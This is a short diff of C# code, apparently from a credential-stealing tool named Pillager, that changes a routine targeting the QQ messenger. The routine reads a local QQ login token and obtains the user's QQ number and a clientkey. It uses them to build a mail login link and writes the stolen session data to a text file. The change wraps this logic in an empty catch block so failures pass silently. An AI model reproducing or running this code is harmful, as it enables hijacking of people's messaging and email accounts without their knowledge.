@@ -126,22 +126,26 @@ namespace Pillager.IM
 
         public static void Save(string path)
         {
-            ServicePointManager.SecurityProtocol = (SecurityProtocolType)(768 | 3072);
-            string pt_local_token = get_pt_local_token();
-            if (pt_local_token == "") return;
-            string uin = get_unis(pt_local_token);
-            if (uin == "") return;
-            string clientkey = get_qkey(pt_local_token, uin);
-            if (clientkey == "") return;
-            string link = get_link(clientkey, uin);
-            if (link == "") return;
+            try
+            {
+                ServicePointManager.SecurityProtocol = (SecurityProtocolType)(768 | 3072);
+                string pt_local_token = get_pt_local_token();
+                if (pt_local_token == "") return;
+                string uin = get_unis(pt_local_token);
+                if (uin == "") return;
+                string clientkey = get_qkey(pt_local_token, uin);
+                if (clientkey == "") return;
+                string link = get_link(clientkey, uin);
+                if (link == "") return;
 
-            string savepath = Path.Combine(path, IMName);
-            Directory.CreateDirectory(savepath);
-            StringBuilder sb = new StringBuilder();
-            sb.AppendLine("QQ:"+ uin);
-            sb.AppendLine("Mail:"+ link);
-            File.WriteAllText(Path.Combine(savepath, IMName + "_ClientKey.txt"), sb.ToString());
+                string savepath = Path.Combine(path, IMName);
+                Directory.CreateDirectory(savepath);
+                StringBuilder sb = new StringBuilder();
+                sb.AppendLine("QQ:" + uin);
+                sb.AppendLine("Mail:" + link);
+                File.WriteAllText(Path.Combine(savepath, IMName + "_ClientKey.txt"), sb.ToString());
+            }
+            catch { }
         }
     }
 }
